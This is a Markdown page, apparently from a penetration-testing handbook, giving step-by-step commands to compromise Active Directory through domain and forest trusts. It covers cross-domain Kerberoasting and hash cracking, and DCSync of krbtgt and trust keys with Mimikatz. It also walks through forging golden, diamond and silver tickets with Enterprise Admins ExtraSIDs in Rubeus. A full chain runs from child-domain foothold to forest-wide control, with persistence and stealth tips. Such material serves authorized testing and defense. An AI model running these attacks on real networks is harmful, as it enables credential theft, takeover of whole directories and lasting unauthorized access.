---
title: "Domain & Forest Trusts — From Windows"
description: "Enumerating and exploiting Active Directory domain and forest trusts from a Windows foothold: SID history injection, golden ticket cross-domain, inter-realm key abuse."
weight: 6
tags: ["active-directory", "trusts", "forest", "windows", "rubeus", "mimikatz", "powerview", "sid-history"]
---

## Quick Reference

| Attack | Requirement | Tool |
|--------|-------------|------|
| Cross-domain Kerberoast | Valid domain user in child | Rubeus |
| Parent-Child escalation | krbtgt hash of child | Mimikatz / Rubeus |
| Diamond Ticket cross-domain | krbtgt AES256 + DA creds | Rubeus |
| One-way inbound abuse | DCSync TDO object | Mimikatz |
| One-way outbound abuse | DCSync TDO GUID | Mimikatz |
| Cross-forest Kerberoast | Trust configured | Rubeus |

---

## Trust Concepts

### Trust Types

| Type | Value | Description |
|------|-------|-------------|
| DOWNLEVEL | 1 | Windows NT 4.0-style trust |
| UPLEVEL | 2 | Active Directory (Kerberos-based) trust |
| MIT | 3 | Non-Windows Kerberos realm |
| DCE | 4 | Theoretical, not used in practice |

**Parent-Child Trust** — A two-way, transitive trust automatically created when a new domain is added to an existing tree. The child domain and parent domain mutually authenticate via Kerberos.

**Tree-Root Trust** — A two-way, transitive trust automatically created when a new domain tree is added to an existing forest.

**External Trust** — A one or two-way, non-transitive trust between domains in different forests. SID filtering is implied by default.

**Forest Trust** — A one or two-way transitive trust between two different forest roots. Enables cross-forest resource sharing.

### Trust Direction Values

| Value | Constant | Meaning |
|-------|----------|---------|
| 0 | TRUST_DIRECTION_DISABLED | Trust is disabled |
| 1 | TRUST_DIRECTION_INBOUND | Remote domain trusts local — remote users can access local resources |
| 2 | TRUST_DIRECTION_OUTBOUND | Local trusts remote — local users can access remote resources |
| 3 | TRUST_DIRECTION_BIDIRECTIONAL | Full mutual trust in both directions |

### Trust Attribute Flags

| Hex | Decimal | Constant | Meaning |
|-----|---------|----------|---------|
| 0x01 | 1 | NON_TRANSITIVE | Trust is not transitive |
| 0x02 | 2 | UPLEVEL_ONLY | Windows 2000+ only |
| 0x04 | 4 | QUARANTINED_DOMAIN | SID Filtering enabled — ExtraSIDs blocked |
| 0x08 | 8 | FOREST_TRANSITIVE | Transitive trust between two forests |
| 0x10 | 16 | CROSS_ORGANIZATION | Selective Authentication enabled |
| 0x20 | 32 | WITHIN_FOREST | Parent-child trust (same forest) |
| 0x40 | 64 | TREAT_AS_EXTERNAL | Treat as external trust; SID filtering implied |
| 0x80 | 128 | USES_RC4_ENCRYPTION | RC4 used instead of AES for inter-realm key |

### Transitivity

Transitivity determines whether a trust extends beyond the two parties that formed it. If Domain A trusts Domain B and Domain B trusts Domain C via transitive trusts, then Domain A implicitly trusts Domain C. Parent-child and forest trusts are transitive. External trusts are non-transitive by default.

### Trusted Domain Objects (TDO)

Every trust relationship is stored in Active Directory as a **Trusted Domain Object (TDO)** under `CN=System`. The TDO holds the trust type, transitivity, direction, and the **shared inter-realm key** (the password used to bridge the cryptographic gap between two KDCs).

The inter-realm key allows a KDC in one domain to issue **referral tickets** that can be validated by the KDC in the trusted domain. Trusts, even in modern Windows versions, use RC4 encryption for this key by default.

### Trust Accounts

After a trust is established, a **trust account** is created in the trusted domain with a `$`-suffixed name matching the flat (NetBIOS) name of the trusting domain. This account's password is the inter-realm key. You can enumerate them with:

```powershell
# Find trust accounts (samAccountType = 805306370)
Get-DomainObject -LDAPFilter "(samAccountType=805306370)" | Select-Object samAccountName
```

---

## Trust Enumeration from Windows

### Native Windows Tools

```powershell
# List all domain trusts
nltest /domain_trusts

# List domain controllers for a specific domain
nltest /dclist:TARGET_DOMAIN

# List trusted domains
nltest /trusted_domains

# Get DC name for a specific domain
nltest /dcname:CHILD_DOMAIN
```

### .NET Framework (No Imports Required)

```powershell
# Enumerate all trusts for the current domain
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# Enumerate all trusts at the forest level
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

### PowerView Enumeration

```powershell
# Basic trust enumeration
Get-DomainTrust
Get-DomainTrust -Domain TARGET_DOMAIN

# Forest-level trust enumeration
Get-ForestTrust
Get-ForestDomain -Forest TARGET_DOMAIN
Get-ForestDomain | Get-DomainTrust

# Check for SID filtering on specific trusts
Get-DomainTrust | Where-Object { $_.TrustAttributes -band 0x00000004 }

# Check for Selective Authentication
Get-DomainTrust | Where-Object { $_.TrustAttributes -band 0x00000010 }
```

### Active Directory Module

```powershell
# Get forest information
Get-ADForest | Select-Object Domains, GlobalCatalogs, SchemaMaster, DomainNamingMaster

# Enumerate all trusts with attributes
Get-ADTrust -Filter * | Select-Object Name, TrustType, TrustDirection, TrustAttributes

# Get trust details for a specific domain
Get-ADTrust -Filter { Name -eq "TARGET_DOMAIN" } | Format-List *
```

### Enumerating TDO Objects Directly

```powershell
# Query TDO objects directly via LDAP filter
Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" -Properties name, trustDirection, trustAttributes, objectGUID
```

---

## Identifying Domain Controllers Across Trusts

```powershell
# Find DCs in a trusted child domain
Get-DomainController -Domain CHILD_DOMAIN

# Find DCs in the parent domain
Get-DomainController -Domain PARENT_DOMAIN

# DNS SRV lookup for DC discovery
nslookup -type=SRV _ldap._tcp.CHILD_DOMAIN
nslookup -type=SRV _ldap._tcp.dc._msdcs.PARENT_DOMAIN

# nltest DC lookup
nltest /dcname:CHILD_DOMAIN
```

---

## Enumerating Users and Groups in Trusted Domains

```powershell
# Enumerate users in a trusted domain
Get-DomainUser -Domain TRUSTED_DOMAIN

# Enumerate groups
Get-DomainGroup -Domain TRUSTED_DOMAIN

# Recursive membership of Domain Admins in parent
Get-DomainGroupMember "Domain Admins" -Domain PARENT_DOMAIN -Recurse

# Enumerate computers
Get-DomainComputer -Domain TRUSTED_DOMAIN

# Find SPNs in the trusted domain (used for Kerberoasting)
Get-DomainUser -SPN -Domain TRUSTED_DOMAIN | Select-Object samAccountName, servicePrincipalName

# Find accounts with no pre-authentication (AS-REP Roasting candidates)
Get-DomainUser -UACFilter DONT_REQ_PREAUTH -Domain TRUSTED_DOMAIN | Select-Object samAccountName

# Enumerate foreign security principals (objects from foreign domains that are members of local groups)
Get-DomainObject -LDAPFilter "(objectClass=foreignSecurityPrincipal)" -Domain TARGET_DOMAIN
Get-DomainForeignGroupMember -Domain TARGET_DOMAIN
```

---

## Cross-Domain Kerberoasting

Kerberoasting works across trust boundaries when a valid domain user from one domain requests service tickets for SPNs in a trusted domain.

```
Rubeus.exe kerberoast /domain:TRUSTED_DOMAIN /dc:DC_HOSTNAME /outfile:cross_kerberoast.txt /format:hashcat
```

```powershell
# PowerView cross-domain Kerberoast
Get-DomainUser -SPN -Domain TRUSTED_DOMAIN | Get-DomainSPNTicket -Domain TRUSTED_DOMAIN -OutputFormat Hashcat
```

Crack with hashcat:

```
hashcat -m 13100 cross_kerberoast.txt wordlist.txt
```

---

## Cross-Domain AS-REP Roasting

AS-REP Roasting targets accounts with Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`). This also works cross-domain.

```
Rubeus.exe asreproast /domain:TRUSTED_DOMAIN /dc:DC_HOSTNAME /format:hashcat /outfile:cross_asrep.txt
```

Crack with hashcat:

```
hashcat -m 18200 cross_asrep.txt wordlist.txt
```

---

## Parent-Child Trust Escalation (Golden Ticket + ExtraSIDs)

This is the most common and impactful trust escalation scenario. When a child domain is compromised to Domain Admin level, an attacker can elevate to **Enterprise Admin** in the parent domain by forging a golden ticket that includes the Enterprise Admins SID (`PARENT_SID-519`) in the SID History field.

SID History was designed to support account migration — when a user moves from one domain to another, their old SID is preserved in the SID History attribute so they retain access to resources. This mechanism can be abused by injecting a privileged SID from the parent domain into a forged ticket.

### Step 1 — Obtain the Child Domain's krbtgt Hash

Run from a machine with DA-level access in the child domain, or directly from the child DC:

```
mimikatz # lsadump::dcsync /domain:CHILD_DOMAIN /user:krbtgt
```

Record both:
- **NTLM hash** (RC4 key) — used when AES is unavailable or for compatibility
- **AES256 key** — preferred for stealth; does not generate RC4 downgrade events

### Step 2 — Get Domain SIDs

```powershell
# Child domain SID (from the child domain)
(Get-ADDomain -Identity CHILD_DOMAIN).DomainSID.Value

# Or via PowerView
Get-DomainSID -Domain CHILD_DOMAIN

# Parent domain SID (query the parent DC directly)
(Get-ADDomain -Identity PARENT_DOMAIN).DomainSID.Value
Get-DomainSID -Domain PARENT_DOMAIN
```

Note: the Enterprise Admins group SID is always `PARENT_SID-519`. You must manually append `-519` to the parent domain SID when forging the ticket.

### Step 3 — Forge the Golden Ticket with ExtraSID

**Mimikatz (RC4/NTLM):**

```
mimikatz # kerberos::golden /user:fake_admin /domain:CHILD_DOMAIN /sid:CHILD_SID /krbtgt:KRBTGT_HASH /sids:PARENT_SID-519 /ptt
```

**Mimikatz (AES256 — preferred, stealthier):**

```
mimikatz # kerberos::golden /user:fake_admin /domain:CHILD_DOMAIN /sid:CHILD_SID /aes256:KRBTGT_AES256 /sids:PARENT_SID-519 /ptt
```

**Rubeus (AES256, inject directly):**

```
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:fake_admin /id:500 /domain:CHILD_DOMAIN /sid:CHILD_SID /sids:PARENT_SID-519 /dc:CHILD_DC_HOSTNAME /ptt
```

Parameter reference:
- `/user` — arbitrary username to impersonate (does not need to exist)
- `/id` — RID of the user; 500 = built-in Administrator
- `/domain` — FQDN of the **child** domain (where krbtgt was taken from)
- `/sid` — SID of the **child** domain
- `/sids` — ExtraSID to inject; `PARENT_SID-519` = Enterprise Admins of parent
- `/aes256` or `/krbtgt` — krbtgt key of the **child** domain

### Step 4 — Verify and Access the Parent Domain

```powershell
# Confirm ticket is in the session
klist

# Access parent DC administrative share
dir \\PARENT_DC_HOSTNAME\C$

# Browse SYSVOL
ls \\PARENT_DC_HOSTNAME\SYSVOL

# Interactive PowerShell session on parent DC
Enter-PSSession -ComputerName PARENT_DC_HOSTNAME

# Run commands on parent DC
Invoke-Command -ComputerName PARENT_DC_HOSTNAME -ScriptBlock { whoami; hostname }
```

If the ticket was injected correctly, you will have full administrative access to the parent DC without any additional credentials.

---

## Diamond Ticket (Parent-Child)

A **Diamond Ticket** is a less suspicious alternative to a Golden Ticket. Instead of creating a ticket from scratch, Rubeus requests a legitimate TGT, decrypts it with the krbtgt key, modifies the PAC (adding ExtraSIDs), re-encrypts it, and injects the result. Because the ticket is derived from a real AS-REQ, it is far less likely to be detected by anomaly-based monitoring.

**Using a plaintext password:**

```
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:USERNAME /password:PASSWORD /enctype:aes /ticketuser:fake_admin /ticketuserid:500 /groups:512 /sids:PARENT_SID-519 /domain:CHILD_DOMAIN /dc:CHILD_DC_HOSTNAME /ptt
```

**Using tgtdeleg (no plaintext password required — uses current session):**

```
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /tgtdeleg /ticketuser:fake_admin /ticketuserid:500 /groups:512 /sids:PARENT_SID-519 /domain:CHILD_DOMAIN /dc:CHILD_DC_HOSTNAME /ptt
```

Parameter reference:
- `/krbkey` — AES256 hash of child domain's krbtgt
- `/tgtdeleg` — use Kerberos unconstrained delegation trick to get a usable TGT for the current user without a password
- `/ticketuser` — username to embed in the modified ticket
- `/ticketuserid` — RID (500 = Administrator)
- `/groups` — group RIDs to embed; 512 = Domain Admins
- `/sids` — ExtraSID for Enterprise Admins of parent (`PARENT_SID-519`)

After injection, verify and access the parent domain the same way as with a golden ticket.

---

## One-Way Inbound Trust Abuse

In an **inbound trust** (`trustDirection: 1`), the **remote domain trusts the local domain**. This means users from the **local domain** can authenticate to the **remote domain** and access its resources.

From an attacker's perspective, if you are in the local domain with DA access, you can DCSync the inter-realm key used for this trust and forge referral tickets to access the trusting (remote) domain.

### Step 1 — Enumerate the Trust and Foreign Security Principals

```powershell
# Confirm inbound trust direction
Get-DomainTrust | Where-Object { $_.TrustDirection -eq "Inbound" }
Get-ADTrust -Filter { TrustDirection -eq "Inbound" } | Select-Object Name, TrustDirection, TrustAttributes

# Enumerate Foreign Security Principals in the trusting domain
# These represent local domain users/groups that have been granted access in the remote domain
Get-DomainObject -LDAPFilter "(objectClass=foreignSecurityPrincipal)" -Domain TARGET_DOMAIN
Get-DomainForeignGroupMember -Domain TARGET_DOMAIN
```

### Step 2 — Identify Interesting FSPs

```powershell
# Resolve the FSP SID to an actual account
$FSP_SID = "S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX"
Get-DomainObject -Identity $FSP_SID | Select-Object samAccountName, distinguishedName
```

### Step 3 — DCSync the Inter-Realm Key (Trust Account)

The local domain has a trust account for the remote domain named `REMOTE_DOMAIN$`. DCSync this account to obtain the inter-realm key (stored as the account password hash):

```
mimikatz # lsadump::dcsync /domain:CHILD_DOMAIN /user:PARENT_DOMAIN$
```

Note the RC4 (NTLM) hash — trusts use RC4 by default even on modern Windows.

### Step 4 — Forge a Referral Ticket (Silver Ticket for krbtgt)

Use the inter-realm key to forge a referral ticket that the remote domain's KDC will accept. The service is `krbtgt/REMOTE_DOMAIN`, which creates a cross-realm TGT:

```
Rubeus.exe silver /service:krbtgt/PARENT_DOMAIN /rc4:INTER_REALM_KEY /user:fake_admin /domain:CHILD_DOMAIN /sid:CHILD_SID /target:PARENT_DOMAIN /ptt
```

### Step 5 — Request a Service Ticket in the Remote Domain

Use the referral ticket (now in memory) to request a TGS for a specific service in the remote domain:

```
Rubeus.exe asktgs /ticket:BASE64_REFERRAL_TICKET /service:cifs/PARENT_DC_HOSTNAME.PARENT_DOMAIN /dc:PARENT_DC_HOSTNAME /ptt
```

### Step 6 — Verify Access

```powershell
klist
dir \\PARENT_DC_HOSTNAME\C$
```

---

## One-Way Outbound Trust Abuse

In an **outbound trust** (`trustDirection: 2`), the **local domain trusts the remote domain**. This means users from the **remote domain** can authenticate to the local domain. An attacker on the local domain may want to access resources in the remote domain.

The local DC has a copy of the inter-realm key stored in the TDO. By DCSync-ing the TDO using its GUID, you obtain this key and can then authenticate to the remote domain as the trust account.

### Step 1 — Enumerate the Trust and Get the TDO GUID

```powershell
# Enumerate outbound trusts and their GUIDs
Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" -Domain TARGET_DOMAIN -Properties name, objectGUID, trustDirection |
    Where-Object { $_.trustDirection -eq 2 }

# Alternative using AD module
Get-ADObject -LDAPFilter "(objectClass=trustedDomain)" -Properties name, objectGUID, trustDirection |
    Where-Object { $_.trustDirection -eq "Outbound" }
```

Record the `objectGUID` value in the format `{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}`.

### Step 2 — DCSync the TDO to Extract the Inter-Realm Key

```
mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /guid:{TDO_GUID}
```

The output contains `[Out]` (current key) and `[Out-1]` (previous key). If the trust was created recently and 30 days have not passed, both keys are the same. Use the RC4 hash (NTLM).

### Step 3 — Request a TGT as the Trust Account

The trust account in the remote domain is named after the local domain's NetBIOS name followed by `$`. Use the inter-realm key as the password hash:

```
Rubeus.exe asktgt /user:TRUSTED_DOMAIN$ /rc4:INTER_REALM_KEY /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /ptt
```

### Step 4 — Enumerate and Access the Trusted Remote Domain

```powershell
# Verify ticket
klist

# Enumerate the remote domain via the trust
Get-DomainUser -Domain TRUSTED_DOMAIN
Get-DomainGroup -Domain TRUSTED_DOMAIN
Get-DomainComputer -Domain TRUSTED_DOMAIN

# Access resources in the remote domain
dir \\TRUSTED_DOMAIN\SYSVOL
```

---

## Cross-Forest Trust Exploitation

Forest trusts (`TRUST_ATTRIBUTE_FOREST_TRANSITIVE`, value 8) link two separate forests. The attack surface depends heavily on the trust configuration.

### Check SID Filtering Status

The first thing to verify is whether SID Filtering is enforced:

```powershell
# Check for QUARANTINED_DOMAIN flag (0x04) on forest trusts
Get-DomainTrust | Where-Object { ($_.TrustAttributes -band 0x08) -and ($_.TrustAttributes -band 0x04) }

# If QUARANTINED_DOMAIN (0x04) is set, ExtraSIDs injection is blocked
# If NOT set, ExtraSIDs injection works across the forest boundary
Get-ADTrust -Filter * | Select-Object Name, TrustAttributes | Format-List
```

**SID Filtering behaviour:**
- `0x04` present — ExtraSID injection blocked; golden ticket + ExtraSIDs will not work cross-forest
- `0x04` absent on a forest trust — ExtraSID injection may work; escalation across forests possible

### Check Selective Authentication

```powershell
# If 0x10 (CROSS_ORGANIZATION) is set, Selective Authentication is enabled
Get-DomainTrust | Where-Object { $_.TrustAttributes -band 0x10 }
```

With Selective Authentication, only accounts that have been explicitly granted the "Allowed to Authenticate" right on target computers can authenticate cross-forest. This severely limits lateral movement.

### Cross-Forest Kerberoasting

Even without SID filtering bypass, you can Kerberoast service accounts in the external forest if the trust allows Kerberos authentication:

```
Rubeus.exe kerberoast /domain:TRUSTED_DOMAIN /dc:DC_HOSTNAME /outfile:cf_kerberoast.txt /format:hashcat
```

```powershell
# PowerView cross-forest Kerberoast
Get-DomainUser -SPN -Domain TRUSTED_DOMAIN | Get-DomainSPNTicket -Domain TRUSTED_DOMAIN -OutputFormat Hashcat
```

Crack with hashcat:

```
hashcat -m 13100 cf_kerberoast.txt wordlist.txt
```

### Cross-Forest ExtraSIDs Abuse (When SID Filtering is Disabled)

If `QUARANTINED_DOMAIN` (0x04) is **not set** on the forest trust:

```powershell
# 1. Obtain krbtgt of the child domain in foreign forest
# (requires DA in that child domain)

# 2. Get SIDs
Get-DomainSID -Domain CHILD_DOMAIN
Get-DomainSID -Domain PARENT_DOMAIN   # target forest root

# 3. Forge golden ticket with ExtraSID targeting parent forest Enterprise Admins
```

```
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:fake_admin /id:500 /domain:CHILD_DOMAIN /sid:CHILD_SID /sids:PARENT_SID-519 /dc:CHILD_DC_HOSTNAME /ptt
```

```powershell
# 4. Access the parent forest DC
dir \\PARENT_DC_HOSTNAME\C$
```

---

## SID History Injection — Concept

SID History is an attribute on user objects that contains SIDs from previous domains (used during migrations). When a user authenticates, the KDC includes all SIDs from the SID History in the Privilege Attribute Certificate (PAC) of the issued TGT.

An attacker with access to the krbtgt secret can forge a TGT with **arbitrary SIDs in the SID History** field (ExtraSIDs). By injecting `PARENT_SID-519` (Enterprise Admins), the forged ticket will be treated by the parent domain's DCs as if the bearer is a member of Enterprise Admins — giving full forest-wide administrative access.

This works because:

1. The child DC signs the golden ticket with the child krbtgt secret
2. When the ticket is presented to the parent DC, it sends a referral ticket back via the trust
3. The parent DC unpacks the PAC and sees the injected Enterprise Admins SID
4. The parent DC grants access as if the user is a real Enterprise Admin

SID Filtering (quarantine) blocks this by stripping non-local SIDs from the PAC before processing — which is why checking for `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN` is a critical pre-exploitation step.

---

## Persistence After Trust Escalation

### Maintain Access to Parent Domain

After achieving Enterprise Admin access in the parent domain, DCSync the parent's krbtgt to create a persistent golden ticket:

```
mimikatz # lsadump::dcsync /domain:PARENT_DOMAIN /user:krbtgt
```

```powershell
# Get parent domain SID
(Get-ADDomain -Identity PARENT_DOMAIN).DomainSID.Value
```

```
Rubeus.exe golden /aes256:PARENT_KRBTGT_AES256 /user:Administrator /id:500 /domain:PARENT_DOMAIN /sid:PARENT_SID /dc:PARENT_DC_HOSTNAME /ptt
```

### Cross-Domain Silver Ticket for Specific Services

For persistent access to a specific service without a full golden ticket:

```
mimikatz # kerberos::golden /user:fake_admin /domain:PARENT_DOMAIN /sid:PARENT_SID /target:PARENT_DC_HOSTNAME.PARENT_DOMAIN /service:cifs /rc4:NTLM_HASH /ptt
```

---

## Operational Notes

### Ticket Injection and Session Management

```powershell
# List current tickets
klist

# Purge all tickets from session
klist purge

# Import a .kirbi ticket file (Mimikatz format)
Rubeus.exe ptt /ticket:C:\path\to\ticket.kirbi

# Import a base64-encoded ticket
Rubeus.exe ptt /ticket:BASE64_TICKET_DATA

# Export tickets from current session
Rubeus.exe dump /service:krbtgt /nowrap
```

### Passing a Ticket to a New Logon Session (for Rubeus)

To avoid contaminating the current session, create a sacrificial logon session:

```cmd
:: Create a sacrificial process with a new logon session
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
```

Then inject into the new session using the LUID:

```
Rubeus.exe ptt /ticket:BASE64_TICKET /luid:0xXXXXXX
```

### Stealth Considerations

| Approach | Stealth Level | Notes |
|----------|---------------|-------|
| Golden Ticket (RC4) | Low | Generates 0x17 (RC4) downgrade events |
| Golden Ticket (AES256) | Medium | No downgrade, but forged PAC may be flagged |
| Diamond Ticket (AES256) | High | Based on real AS-REQ; harder to detect |
| DCSync over network | Medium | Generates replication traffic; monitor for non-DC accounts doing replication |

---

## Full Attack Chain: Child to Parent Forest Compromise

This is the complete end-to-end workflow from initial foothold in a child domain to full forest compromise.

```
FOREST ROOT:  PARENT_DOMAIN
              |
              +-- CHILD_DOMAIN  <-- Attacker starts here
```

### Phase 1 — Establish Foothold in Child Domain

```powershell
# Verify current domain context
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
whoami /all

# Enumerate the environment
Get-DomainTrust
Get-DomainController -Domain CHILD_DOMAIN
Get-DomainController -Domain PARENT_DOMAIN
```

### Phase 2 — Escalate to Domain Admin in Child

Using any available privilege escalation technique:

```powershell
# Enumerate for common escalation vectors
# Kerberoastable accounts
Get-DomainUser -SPN | Select-Object samAccountName, servicePrincipalName

# AS-REP Roastable accounts
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samAccountName

# Unconstrained delegation machines
Get-DomainComputer -Unconstrained | Select-Object dnsHostName

# ACL abuses
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match "USERNAME" }
```

### Phase 3 — DCSync Child krbtgt

Once DA in child domain is achieved:

```
mimikatz # lsadump::dcsync /domain:CHILD_DOMAIN /user:krbtgt
```

Record:
- `Hash NTLM: KRBTGT_HASH`
- `aes256-cts-hmac-sha1-96: KRBTGT_AES256`

### Phase 4 — Collect Domain SIDs

```powershell
# Child SID
(Get-ADDomain -Identity CHILD_DOMAIN).DomainSID.Value
# Result: CHILD_SID

# Parent SID
(Get-ADDomain -Identity PARENT_DOMAIN).DomainSID.Value
# Result: PARENT_SID

# Enterprise Admins SID = PARENT_SID + "-519"
```

### Phase 5 — Forge Golden Ticket with Enterprise Admins ExtraSID

```
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:fake_admin /id:500 /domain:CHILD_DOMAIN /sid:CHILD_SID /sids:PARENT_SID-519 /dc:CHILD_DC_HOSTNAME /ptt
```

### Phase 6 — Access Parent DC

```powershell
klist
dir \\PARENT_DC_HOSTNAME\C$
ls \\PARENT_DC_HOSTNAME\SYSVOL
Enter-PSSession -ComputerName PARENT_DC_HOSTNAME
```

### Phase 7 — DCSync Parent krbtgt

```
mimikatz # lsadump::dcsync /domain:PARENT_DOMAIN /user:krbtgt
```

### Phase 8 — Forge Parent Golden Ticket (Persistent Access)

```
Rubeus.exe golden /aes256:PARENT_KRBTGT_AES256 /user:Administrator /id:500 /domain:PARENT_DOMAIN /sid:PARENT_SID /dc:PARENT_DC_HOSTNAME /ptt
```

### Phase 9 — Extend to Additional Domains / Forests

Repeat the process upward through any additional trust relationships:

```powershell
# Enumerate trusts from the newly compromised parent
Get-ForestTrust
Get-DomainTrust -Domain PARENT_DOMAIN

# Continue the chain for any additional forest/domain trusts
```

---

## Troubleshooting

### Ticket Not Accepted by Parent DC

```powershell
# Ensure clock skew is within 5 minutes of the target DC
# Kerberos requires time sync within +/- 5 minutes

w32tm /query /status
w32tm /resync /force

# If clock skew is the issue, sync with the target DC:
net time \\PARENT_DC_HOSTNAME /set /yes
```

### Access Denied After Ticket Injection

```powershell
# Verify the injected SIDs are correct
klist

# Confirm the parent domain SID is accurate
# A single wrong digit will cause authentication failure
Get-DomainSID -Domain PARENT_DOMAIN

# Check SID filtering — if QUARANTINED_DOMAIN flag is set, ExtraSIDs are stripped
Get-ADTrust -Filter { Name -eq "PARENT_DOMAIN" } | Select-Object TrustAttributes
# TrustAttributes containing 0x04 means SID filtering is active
```

### DCSync Fails for TDO GUID

```powershell
# Ensure you have the correct GUID format including curly braces
# Example: {288d9ee6-2b3c-42aa-bef8-959ab4e484ed}

Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" -Properties name, objectGUID |
    Select-Object name, @{N="GUID"; E={ "{$($_.objectGUID)}" }}
```

### Referral Ticket Rejected

Trusts may use AES instead of RC4 if `USES_RC4_ENCRYPTION` (0x80) is **not** set:

```powershell
Get-ADTrust -Filter * | Where-Object { -not ($_.TrustAttributes -band 0x80) } |
    Select-Object Name, TrustAttributes
```

If RC4 is not available for the trust, you need the AES inter-realm key instead. DCSync again and note the AES keys in the output.

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
